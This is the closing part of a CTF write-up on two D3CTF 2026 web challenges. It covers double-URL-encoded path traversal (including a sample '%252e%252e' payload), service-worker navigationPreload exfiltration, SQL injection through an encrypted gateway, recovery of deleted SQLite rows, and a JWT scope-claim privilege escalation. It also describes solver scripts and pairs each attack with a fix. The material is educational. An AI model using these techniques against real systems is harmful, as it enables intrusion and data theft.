**Double URL encoding (`%25xx`) is a persistent path-traversal bypass with real-world CVE history.** The canonical encoding of a percent sign is `%25`. A double-encoded dot is `%252e` — `%25` followed by `2e`. On a single decode pass it becomes `%2e`; on a second pass it becomes `.`. This technique appeared in Apache httpd `mod_rewrite` (CVE-2021-41773 and CVE-2021-42013, which allowed remote code execution on misconfigured servers) and has been exploited in dozens of WAF and path-normalization bypasses since. The portable fix: decode exactly once, normalize the result, and reject any path whose canonical form fails the security check. Checking a partially-decoded path is equivalent to checking a different string than the one the file system will act on.

**Service workers registered on a shared origin can intercept any in-scope path, regardless of which tenant uploaded the script.** When an application serves multiple tenants' static files on the same origin, a service worker registered by one tenant with the appropriate scope header can intercept navigations to any other tenant's in-scope path. The `Service-Worker-Allowed` header on user-controlled content is particularly dangerous: it allows the script to claim a scope beyond its own directory. The only complete mitigation is **origin isolation** — serve each tenant's files on a distinct origin (e.g., `<username>.static.example.com`) so that service workers registered in one tenant's origin cannot reach another tenant's pages. Path-prefix isolation on a single shared origin is not a security boundary for service workers.

**Legacy endpoints registered in an internal dispatcher but removed from the public router are still enumerable by any client who can speak the protocol.** Ghost Zero's `/ddddddtestStat` was absent from the public HTTP routes — a request to that path returned `404`. But it was still registered in the encrypted gateway's dispatch table. An attacker who reads the client source, implements the protocol, and sends arbitrary targets to the dispatcher will discover it. The correct fix is to remove or gate legacy operations from **all** dispatchers simultaneously, not only from the public-facing router. An encrypted channel does not prevent enumeration by a client who already possesses the key material — and in a browser application, every client has the key material.

## Frequently asked questions

### What is D3CTF 2026?

D3CTF 2026 is a Capture-the-Flag competition organized by the D3 security team. The 2026 web track included two challenges: Scope Drift (632 pts, 78 solves) covering service-worker scope confusion via double-encoded path traversal and `navigationPreload` exploitation, and Ghost Zero (909 pts, 36 solves) covering AES-GCM encrypted gateway enumeration, SQLite deleted-row recovery, and JWT privilege escalation via missing scope claim validation. Per-challenge READMEs and solver scripts live at [Abdelkad3r/D3CTF-2026](https://github.com/Abdelkad3r/D3CTF-2026).

### What is the double URL encoding bypass in Scope Drift?

A percent sign itself encodes as `%25`. A double-encoded dot is `%252e`: after one decode pass it becomes `%2e` (still percent-encoded); after a second pass it becomes the literal `.` character. An application that decodes a path once for its security check and then passes it to a component that decodes it again sees different bytes at each stage. Submitting `/u/guest/%252e%252e/admin/sw.js` causes the upload validator to check `/u/guest/%2e%2e/admin/sw.js` — which still begins with `/u/guest/` and passes the namespace check — while the static file server resolves the file to `/u/admin/sw.js` in the admin namespace.

### Why does plain fetch(event.request) return 403 when intercepting the admin dashboard?

When a service worker intercepts a navigation and calls `fetch(event.request)`, it issues a new HTTP request from the service worker's execution context. This worker-initiated request differs from the browser's original navigation in session handling, redirect-following flags, and internal routing context. In Scope Drift the server at `localhost:3000` distinguished between navigation requests — which carried the bot's privileged internal session — and worker-initiated fetches, which did not. The server returned `403 Forbidden` to the replay but would have returned `200 OK` to the browser's own navigation.

### What is navigationPreload and why does it expose the privileged dashboard?

Navigation Preload is a browser API that sends the navigation request to the server immediately, before the service worker finishes activating. When enabled during the worker's `activate` event, the browser's network stack performs the real navigation in parallel with booting the worker and stores the response as `event.preloadResponse`. Because this response is the result of the browser's own navigation — not a worker-initiated replay — it carries the bot's full internal session context and the server returns the actual `200 OK` dashboard HTML. The service worker reads this real response from `event.preloadResponse` and exfiltrates it, without needing to perform any replay.

### How does SQL injection work inside the Ghost Zero encrypted gateway?

The AES-GCM transport protects the channel from passive eavesdroppers but does not prevent the client from submitting arbitrary plaintext through it. A client who implements the gateway protocol — fully specified in the browser's JavaScript source — can send any `target` and `body` values, including SQL injection strings in the `q` field of the `search` target. The server decrypts the packet and interpolates `q` into a SQLite `LIKE` query without parameterization. Encryption provides confidentiality against third parties; it does not sanitize input or prevent authenticated clients from sending malicious data.

### How are deleted SQLite rows recovered using sqlite_dbpage?

SQLite stores table rows as B-tree records in fixed-size pages. When a row is deleted, SQLite marks its space as free but does not overwrite the bytes — the page is added to the free list and may be reused for new data later. The `sqlite_dbpage` virtual table exposes the raw bytes of every database page. By querying the page number of the hidden table's root page and reading its hex content, an attacker can scan for printable ASCII strings and recover deleted row data. In Ghost Zero this technique recovered the pcap download path. Running `VACUUM` after deletion rewrites all pages, destroying free-space content; alternatively, sensitive references should not be stored in database rows at all.

### Why did /api/auth/exchange accept a session-scoped ticket and issue an admin token?

The exchange endpoint verified that the ticket was a properly-signed ES256 JWT, that its `typ` claim was `"ticket"`, and that its `aud` claim matched the expected audience. It did not verify the `scope` claim. The ticket returned by `/ddddddtestStat` carried `scope:"session"` — intended by the issuer to indicate a low-privilege session bootstrap — but the exchange endpoint treated any validly-signed ticket as sufficient to mint an admin access token. The missing check was a single conditional: reject tickets whose `scope` is not `"admin-bootstrap"`. Omitting that check made the scope field semantically meaningless at the enforcement point — the attacker obtained a validly-signed ticket by any means and exchanged it for full admin access.

### Where can I find the D3CTF 2026 web exploit scripts?

Per-challenge READMEs, handouts, and solver scripts live at [Abdelkad3r/D3CTF-2026](https://github.com/Abdelkad3r/D3CTF-2026). Scope Drift's solver is `exploit.py` — a Python 3 script that uploads the service worker and registration page via the double-encoding bypass, submits the guest page for bot review, and polls the webhook inbox for the captured dashboard HTML containing the flag. Ghost Zero's solver is `exploit.mjs` — a Node.js ES module that bootstraps an ECDH session, derives AES-GCM keys with HKDF, calls the hidden `/ddddddtestStat` gateway operation, extracts the signed ticket, sends it to `/api/auth/exchange`, and prints the flag — all from a single `node exploit.mjs <target>` invocation.

## Closing notes

Two web challenges from D3CTF 2026, one common root failure: **the enforcement point was separated from the decision point**. Scope Drift's upload validator made a security decision on a partially-decoded path; the static file server decoded it further and reached a different location. Ghost Zero's exchange endpoint made a security decision based on three JWT claims while silently passing over the fourth — the one that was supposed to distinguish a low-privilege session ticket from a high-privilege admin-bootstrap ticket.

Both primitives are well-documented in the security literature. Double-encoded path traversal bypassing single-decode validators has CVEs in Apache httpd and multiple WAF products. Incomplete JWT claim validation — where the signature is checked but a restricting claim is skipped — is a recurring pattern in authentication middleware privilege escalation bugs. The reason they appear in CTF challenges and production systems alike is that both require surfacing an implicit assumption the developer never wrote down: "this check covers all relevant representations of the path" or "these are all the claims that matter for the authorization decision." Making that assumption explicit — as an assertion, a test, a documented invariant, or a type constraint that makes the unchecked path unrepresentable — would have caught both bugs at development time.

The other D3CTF 2026 tracks: the [crypto writeup](/ctf-writeups/) covers D3HFERP's simplified HFERP scheme; the pwn writeup covers d3kbus and d3kbus-revenge; the reverse writeup covers D3LLVM and PacMan. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "What is D3CTF 2026?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "D3CTF 2026 is a Capture-the-Flag competition organized by the D3 security team. The 2026 web track included Scope Drift (632 pts, 78 solves) covering service-worker scope confusion via double-encoded path traversal and navigationPreload exploitation, and Ghost Zero (909 pts, 36 solves) covering AES-GCM encrypted gateway enumeration, SQLite deleted-row recovery via sqlite_dbpage, and JWT privilege escalation via missing scope claim validation. Per-challenge READMEs and solver scripts live at github.com/Abdelkad3r/D3CTF-2026."
      }
    },
    {
      "@type": "Question",
      "name": "What is the double URL encoding bypass in Scope Drift?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "A percent sign encodes as %25. A double-encoded dot is %252e: after one decode pass it becomes %2e (still percent-encoded); after a second pass it becomes the literal dot. An application that decodes a path once for its security check and then passes it to a component that decodes it again sees different bytes at each stage. Submitting /u/guest/%252e%252e/admin/sw.js causes the upload validator to check a path that still starts with /u/guest/ while the static file server resolves the file to /u/admin/sw.js in the admin namespace."
      }
    },
    {
      "@type": "Question",
      "name": "Why does plain fetch(event.request) return 403 when intercepting the admin dashboard?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "A service-worker fetch(event.request) issues a worker-initiated request, not a browser navigation. It originates from the service worker context and may lack the session-handling flags and internal routing context that the server uses to authorize a navigation. In Scope Drift the internal server at localhost:3000 distinguished between navigation requests (which carried the bot's privileged session) and worker-initiated fetches (which did not), returning 403 to the replay and 200 to the real navigation."
      }
    },
    {
      "@type": "Question",
      "name": "What is navigationPreload and why does it expose the privileged dashboard?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Navigation Preload is a browser API that sends the navigation request to the server immediately, before the service worker finishes activating. The browser stores the real navigation response as event.preloadResponse. Because this is the browser's own navigation — not a worker-initiated replay — it carries the bot's full session context and the server returns the actual 200 OK dashboard. The service worker reads event.preloadResponse and exfiltrates it without performing any replay."
      }
    },
    {
      "@type": "Question",
      "name": "How does SQL injection work inside the Ghost Zero encrypted gateway?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "AES-GCM transport protects the channel from passive eavesdroppers but does not prevent the authenticated client from submitting arbitrary plaintext through it. A client who implements the gateway protocol — fully specified in the browser's JavaScript source — can send any target and body values, including SQL injection strings in the q field of the search target. The server decrypts the packet and interpolates q into a SQLite query without parameterization. Encryption provides confidentiality against third parties, not input sanitization."
      }
    },
    {
      "@type": "Question",
      "name": "How are deleted SQLite rows recovered using sqlite_dbpage?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "SQLite marks deleted rows as free but does not overwrite their bytes. The sqlite_dbpage virtual table exposes raw page data. By reading the page number of the hidden table's root page and scanning the hex dump for ASCII strings, an attacker recovers deleted row content. In Ghost Zero this recovered a pcap download path. Running VACUUM after deletion rewrites all pages, destroying free-space content."
      }
    },
    {
      "@type": "Question",
      "name": "Why did /api/auth/exchange accept a session-scoped ticket and issue an admin token?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The exchange endpoint verified the ES256 signature, the typ claim (ticket), and the aud claim, but not the scope claim. The ticket from /ddddddtestStat carried scope:session — intended to indicate low privilege — but the endpoint treated any validly-signed ticket as sufficient to mint an admin access token. The missing check was a single conditional rejecting tickets whose scope was not admin-bootstrap. Omitting it made the scope field meaningless at the enforcement point."
      }
    },
    {
      "@type": "Question",
      "name": "Where can I find the D3CTF 2026 web exploit scripts?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Per-challenge READMEs, handouts, and solver scripts live at github.com/Abdelkad3r/D3CTF-2026. Scope Drift's solver is exploit.py — a Python 3 script that uploads the service worker via double-encoding, submits the guest page for bot review, and polls the webhook inbox for the captured dashboard. Ghost Zero's solver is exploit.mjs — a Node.js ES module that bootstraps an ECDH session, derives AES-GCM keys, calls the hidden gateway operation, exchanges the ticket for an admin token, and prints the flag in a single automated run."
      }
    }
  ]
}
</script>
